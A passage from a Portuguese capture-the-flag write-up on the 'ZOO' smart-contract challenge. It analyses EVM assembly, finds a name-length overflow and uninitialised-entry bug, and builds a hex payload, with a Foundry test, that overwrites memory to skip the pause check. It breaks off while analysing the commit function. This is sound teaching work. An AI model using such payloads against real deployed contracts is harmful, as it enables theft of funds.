</span></span></code></pre></td></tr></table></div></div><p>Vamos desenhar o que acabamos de descobrir então.
Abaixo temos o layout do array:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+0x000 tamanho do array         &lt;---- local_animals aponta pra cá
</span></span><span class=line><span class=cl>+0x020 endereço do elemento 0
</span></span><span class=line><span class=cl>+0x040 endereço do elemento 1
</span></span><span class=line><span class=cl>+0x060 endereço do elemento 2
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>+0x100 endereço do elemento 7
</span></span></code></pre></td></tr></table></div></div><p>E abaixo temos o layout de um dos elementos.
Note que <code>animal_index</code> e <code>name_length</code>
são lidos como números de 2 bytes da calldata,
mas armazenados como números de 32 bytes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>+</span><span class=mh>0x00</span> <span class=n>animal_index</span>             <span class=o>&lt;----</span> <span class=p>(</span><span class=n>local_animals</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)[</span><span class=n>n</span><span class=p>]</span> <span class=n>aponta</span> <span class=n>pra</span> <span class=n>cá</span>
</span></span><span class=line><span class=cl><span class=o>+</span><span class=mh>0x20</span> <span class=n>name_length</span>
</span></span><span class=line><span class=cl><span class=o>+</span><span class=mh>0x40</span> <span class=n>name</span> <span class=p>(</span><span class=n>tamanho</span> <span class=n>variável</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Conclusão:
a operação <code>0x10</code> recebe os argumentos
<code>idx</code>, <code>animal_index</code>, <code>name_length</code> e <code>name</code> da calldata,
aloca e preenche um animal com esses valores,
e adiciona ele no array <code>local_animals</code> no índice <code>idx</code>.</p><h2 id=operação-0x20---edit-animal>Operação 0x20 - Edit animal<a hidden class=anchor aria-hidden=true href=#operação-0x20---edit-animal>#</a></h2><p>Entrando no <code>case</code> da operação <code>0x20</code>,
temos o mesmo início da operação anterior:
o primeiro byte vai para o <code>idx</code> (que não pode ser maior que 7).</p><p>O resto do <code>case</code> pega o próximo byte e o chama de <code>edit_type</code>.
Em seguida,
temos um outro <code>switch</code> que se separa em dois valores para <code>edit_type</code>:
<code>0x21</code> e <code>0x22</code>.
Não vamos falar sobre o <code>0x22</code>,
pois ele não foi utilizado na solução.</p><p>Quando <code>edit_type</code> é <code>0x21</code>,
o contrato lê 2 bytes para <code>name_length</code> e
em seguida copia os <code>name_length</code> bytes seguintes
pra sobrescrever o <code>name</code> do animal sendo editado.</p><p>O ponto mais interessante aqui é que
o <code>name_length</code> anterior não é verificado,
então podemos editar um animal com um <code>name</code> maior que o anterior,
ou seja, um overflow para o animal de baixo.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>edit_type</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit_type</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=n>edit_type</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>switch</span> <span class=n>edit_type</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=mh>0x21</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>shr</span><span class=p>(</span><span class=mh>0xf0</span><span class=p>,</span> <span class=n>name_length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mcopy</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>arr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>i</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>name_length</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=sobrescrevendo-o-array-functions>Sobrescrevendo o array functions<a hidden class=anchor aria-hidden=true href=#sobrescrevendo-o-array-functions>#</a></h1><p>Fazendo esse desafio,
eu demorei bastante tempo pra pensar numa forma
de sobrescrever o array <code>functions</code>.
Afinal, o overflow que encontramos na edição de animais
simplesmente não alcança o array,
porque ele vem antes dos animais.</p><p>Pra entender melhor onde as coisas se situam na memória,
podemos usar o debugger do <a href=https://github.com/foundry-rs/foundry>foundry</a>.
Pra isso,
basta criar um projeto novo com <code>forge init</code>
e criar um teste.
Como teste,
vamos criar um animal com:</p><ul><li><code>idx = 0x00</code></li><li><code>name_length = 0x0005</code></li><li><code>index = 0xaabb</code></li><li><code>name = 0x1122334455</code></li></ul><p>Com a análise da função <code>fallback</code> que fizemos,
vemos que basta mandar essa sequência de bytes: <code>10000005aabb1122334455</code>.
Dessa forma,
nosso contrato só precisa chamar <code>fallback</code>
e passar esses bytes como argumento.
Como <code>fallback</code> na verdade não é exatamente uma função,
temos que usar <code>call</code> e passar nossos bytes pra ele.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>import</span> <span class=p>{</span><span class=n>Test</span><span class=p>,</span> <span class=n>console</span><span class=p>}</span> <span class=n>from</span> <span class=s2>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=p>{</span><span class=n>ZOO</span><span class=p>}</span> <span class=n>from</span> <span class=s2>&#34;../src/ZOO.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>contract</span> <span class=n>ZOOTest</span> <span class=n>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ZOO</span> <span class=n>public</span> <span class=n>zoo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>setUp</span><span class=p>()</span> <span class=n>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>zoo</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ZOO</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>test_bypass_pause</span><span class=p>()</span> <span class=n>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>bytes</span> <span class=n>memory</span> <span class=n>b</span> <span class=o>=</span> <span class=n>hex</span><span class=s2>&#34;10000005aabb1122334455&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=ne>bool</span> <span class=n>success</span><span class=p>,</span> <span class=n>bytes</span> <span class=n>memory</span> <span class=n>ret</span><span class=p>)</span> <span class=o>=</span> <span class=n>address</span><span class=p>(</span><span class=n>zoo</span><span class=p>)</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>success</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>ret</span><span class=o>.</span><span class=n>length</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>assembly</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>let</span> <span class=n>size</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>revert</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=n>ret</span><span class=p>),</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>revert</span><span class=p>(</span><span class=s2>&#34;Revert without reason&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>zoo</span><span class=o>.</span><span class=n>isSolved</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>console</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=s2>&#34;Success&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>console</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=s2>&#34;Fail&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Se rodarmos o teste, vemos que ele falhou
porque a função <code>EnforcedPause()</code> foi chamada.
Isso é esperado,
já que <code>commit</code> foi chamada normalmente e o contrato estava pausado,
como vimos antes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ forge test -vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[⠊] Compiling...
</span></span><span class=line><span class=cl>No files changed, compilation skipped
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test for test/ZOO.t.sol:ZOOTest
</span></span><span class=line><span class=cl>[FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506)
</span></span><span class=line><span class=cl>Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 933.39µs (64.20µs CPU time)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test suite in 5.14ms (933.39µs CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Failing tests:
</span></span><span class=line><span class=cl>Encountered 1 failing test in test/ZOO.t.sol:ZOOTest
</span></span><span class=line><span class=cl>[FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Encountered a total of 1 failing tests, 0 tests succeeded
</span></span></code></pre></td></tr></table></div></div><p>Pra debugar,
é só mudar o comando pra <code>forge test --debug test_bypass_pause</code>.
Isso vai abrir o <a href=https://book.getfoundry.sh/forge/debugger>debugger do foundry</a>,
que nos permite executar o programa passo a passo
e ver o que exatamente tá na memória.</p><p>Abaixo eu parei o programa logo depois
do <code>mstore</code> que incrementa <code>animals_count</code>
na hora de adicionar o animal.
A overview da memória que o foundry mostra
é meio assustura a princípio por conta da quantidade de números em cada linha,
mas a lógica é exatamente a mesma do que você veria debugando x64.
A diferença é que ao invés de 8 bytes por linha, são 32.</p><p>Na screenshot, basicamente tudo que o programa fez está marcado.
Dessa forma,
fica fácil de ver que o overflow na hora de editar um animal
não serviria pra sobrescrever <code>functions</code>,
porque esse array fica bem antes de onde os animais ficam.</p><p><img alt="Memória do contrato" loading=lazy src=/images/ottoboni-sekai-zoo/memory.png></p><h1 id=usando-animais-não-inicializados-como-trampolim-pra-bypassar-o-whennotpaused>Usando animais não inicializados como trampolim pra bypassar o whenNotPaused<a hidden class=anchor aria-hidden=true href=#usando-animais-não-inicializados-como-trampolim-pra-bypassar-o-whennotpaused>#</a></h1><p>Na screenshot do debugger que vimos,
chama atenção o fato de
quase todo o array de animais estar zerado.
Isso acontece porque só adicionamos um animal no índice 0,
os outros índices ficam zerados por padrão,
sem serem inicializados.</p><p>Na verdade,
o código nunca checa de fato se um animal foi inicializado antes de acessá-lo.
O que aconteceria então se editássemos um animal que não foi inicializado?
Usando a screenshot como base,
o segundo animal não foi inicializado.
Se passarmos <code>idx=0x01</code>,
<code>temp</code> será o endereço desse animal,
no caso o endereço que é todo zeros.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>offset</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>local_animals</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>mul</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=n>idx</span><span class=p>))</span> <span class=o>//</span> <span class=n>isso</span> <span class=n>seria</span> <span class=mh>0x0140</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>temp</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>                                   <span class=o>//</span> <span class=n>isso</span> <span class=n>seria</span> <span class=mi>0</span>
</span></span></code></pre></td></tr></table></div></div><p>Na hora de copiar o nome,
ele será copiado para <code>0x00 + 0x40</code>,
que é <code>0x40</code>,
o free memory pointer.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mcopy(
</span></span><span class=line><span class=cl>    add(temp, 0x40),           // como temp=0, isso seria 0x40
</span></span><span class=line><span class=cl>    add(add(arr, 0x20), i),
</span></span><span class=line><span class=cl>    name_length
</span></span><span class=line><span class=cl>)
</span></span></code></pre></td></tr></table></div></div><p>Dessa forma,
conseguimos escrever qualquer coisa de <code>0x40</code> pra baixo,
incluindo <code>0xa0</code>,
que é onde o endereço da <code>commit</code> fica.
Ainda assim,
temos algumas questões a resolver,
porque somos obrigados a escrever por cima
de outros valores para chegar em <code>0xa0</code>.
Vamos revisar eles um a um:</p><ul><li><code>0x40</code> - Esse é o free memory pointer. Intuitivamente, podemos escrever aqui qualquer coisa maior (mas não MUITO maior) ou igual ao valor original que tudo deve dar certo.</li><li><code>0x60</code> - Esse endereço é na verdade sempre zerado. Podemos simplesmente escrever zero aqui então.</li><li><code>0x80</code> - Esse é o tamanho do array functions. Só escrever <code>0x01</code> aqui pra não mudar nada.</li></ul><p>Sem problemas então,
já sabemos o que escrever em cada endereço
antes de chegar em <code>0x0a</code>.</p><p>Agora a questão é,
o que escrever em <code>0x0a</code>?
Com o debugger,
podemos ver que o endereço que estava originalmente lá
vai para a função <code>whenNotPaused</code>,
do contrato <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Pausable.sol#L54>Pausable</a>.
A primeira linha chama <code>_requireNotPaused</code>,
que é a função que chama <code>revert</code> se o contrato estiver pausado.
Basta então pular para onde essa função retornaria.
Usando o debugger,
fica fácil ver que esse endereço é <code>0x0323</code>.</p><p><img alt=Pausable.sol loading=lazy src=/images/ottoboni-sekai-zoo/jump.png></p><p>Finalmente,
podemos montar nosso payload pra bypassar o <code>whenNotPaused</code>.</p><ul><li><code>0x20</code> (1 byte), pra editar um animal.</li><li><code>0x07</code> (1 byte), pra escolher o último índice (poderia ser qualquer um).</li><li><code>0x21</code> (1 byte), pra escolher o <code>edit_type</code>.</li><li><code>0x80</code> (2 bytes), porque vamos escrever 128 bytes.</li><li><code>0xffff</code> (32 bytes), pra sobrescrever o free memory pointer.</li><li><code>0x00</code> (32 bytes), pra sobrescrever o endereço que sempre tem zeros.</li><li><code>0x01</code> (32 bytes), pra sobrescrever o tamanho do array functions.</li><li><code>0x0323</code> (32 bytes), que é o endereço pra onde queremos pular.</li></ul><p>Payload: <code>2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323</code></p><p>Depois de atualizar o contrato teste
com esse payload e rodar o teste,
vemos que agora não temos mais o erro dizendo que o contrato tá pausado.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ forge test -vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[⠊] Compiling...
</span></span><span class=line><span class=cl>[⠊] Compiling 1 files with Solc 0.8.25
</span></span><span class=line><span class=cl>[⠒] Solc 0.8.25 finished in 931.41ms
</span></span><span class=line><span class=cl>Compiler run successful!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test for test/ZOO.t.sol:ZOOTest
</span></span><span class=line><span class=cl>[PASS] test_bypass_pause() (gas: 12362)
</span></span><span class=line><span class=cl>Logs:
</span></span><span class=line><span class=cl>  Fail
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.39ms (8.61ms CPU time)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ran 1 test suite in 9.84ms (9.39ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
</span></span></code></pre></td></tr></table></div></div><p>Com o debugger,
também é possível verificar que o valor foi sobrescrito
e que agora o contrato está entrando na função <code>commit</code>.</p><p><img alt="Array functions sobrescrito" loading=lazy src=/images/ottoboni-sekai-zoo/overwritten.png></p><h1 id=objetivo-final--sstore11>Objetivo final = sstore(1,1)<a hidden class=anchor aria-hidden=true href=#objetivo-final--sstore11>#</a></h1><p>Ótimo,
conseguimos com sucesso bypassar o <code>WhenNotPaused</code>.
E agora?
Agora a gente tem que descobrir
uma forma de sobrescrever a variável <code>isSolved</code>.
Pra isso, vamos revisar como ela foi declarada primeiro:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>contract ZOO is Pausable {
</span></span><span class=line><span class=cl>    uint256 public isSolved;
</span></span><span class=line><span class=cl>    &lt;snip&gt;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Essa variável <strong>não está na memória</strong>,
ela pertence ao contrato em si
e é armazenada na própria blockchain.
Variáveis desse tipo ficam armazenadas no que chamam de storage.
Pra interagir com essas variáveis,
temos as instruções <code>sload</code> e <code>sstore</code>.
A primeira pra ler e a segunda pra escrever.
Cada uma dessas variáveis fica armazenada em um slot,
que é referenciado usando um número de 32 bytes.
Nos casos mais simples,
tipo de um simples <code>uint256</code>,
o número do slot simplesmente vai incrementando de 1 em 1 a partir do zero
(a primeira variável ficaria no slot <code>0</code>, a segunda no <code>1</code> e assim por diante),
mas tem uns casos <a href=https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html>mais enrolados</a>
em que não é tão simples assim.</p><p>Enfim,
esse caso é simples e <code>isSolved</code> fica no slot <code>1</code>.
Não é no <code>0</code> porque na verdade tem uma variável escondida que armazena
se o contrato está pausado ou não meio que implícita.
Precisamos então setar a variável no slot <code>1</code> para <code>1</code>.
Isso seria <code>sstore(1,1)</code> em assembly.</p><p>Vamos então analisar o assembly da <code>commit</code>
e ver como isso poderia ser possível.
Relaxa que essa é menor que a <code>fallback</code>.</p><h1 id=a-função-commit>A função commit<a hidden class=anchor aria-hidden=true href=#a-função-commit>#</a></h1><p>Primeiro vamos lembrar que
o único argumento dessa função se chama <code>data</code>
e é aquele array que a <code>fallback</code> constrói.
Sendo um array,
a primeira coisa que a função faz é loopar
cada elemento dele.
De agora em diante todos os trechos
serão uma iteração desse loop.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>counter</span> <span class=p>:</span><span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>length</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>lt</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>snip</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Dentro do loop,
o <code>index</code> e <code>name_length</code> do animal são lidos.
Detalhe que nessa função o index do animal é chamado de <code>idx</code>,
o que tinha um significado diferente na outra função.
Meio confuso,
mas não fui eu que escrevi o código.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>memPtr</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>ptr</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>),</span> <span class=n>counter</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>name</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>name_length</span> <span class=p>:</span><span class=o>=</span> <span class=n>mload</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>counter</span> <span class=p>:</span><span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>counter</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Agora eu vou pular umas boas linhas de código
que não fazem nada de relevante pra solução
e ir direto ao ponto.
Atenção aqui que esse é o pulo do gato.
Temos uma varíavel <code>slot_hash</code>,
que é o hash de um trecho de memória.
Aqui o valor da variável não é super importante,
só é importante saber que é um número previsível.</p><p>Temos também uma variável <code>animal_counter</code>,
que é lida do storage usando <code>sload</code>.
O slot do qual essa variável é lida depende de <code>idx</code>,
um valor que a gente controla.
O ponto importante aqui é que se <code>sload</code> recebe
um slot nada a ver,
que não tem nada,
ele retorna <code>0</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>let</span> <span class=n>slot_hash</span> <span class=p>:</span><span class=o>=</span> <span class=n>keccak256</span><span class=p>(</span><span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>let</span> <span class=n>animal_counter</span> <span class=p>:</span><span class=o>=</span> <span class=n>sload</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>add</span><span class=p>(</span><span class=n>slot_hash</span><span class=p>,</span> <span class=n>mul</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>idx</span><span class=p>)),</span> <span class=mi>1</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>Por fim,
temos o tão esperado <code>sstore</code>.
Só precisamos transformar os dois números que ele recebe em <code>1</code>
e o chall está resolvido.
O segundo argumento é fácil,
praticamente qualquer valor de <code>idx</code> vai
fazer com que <code>animal_counter</code> seja <code>0</code>,
e <code>0+1=1</code>, QED.
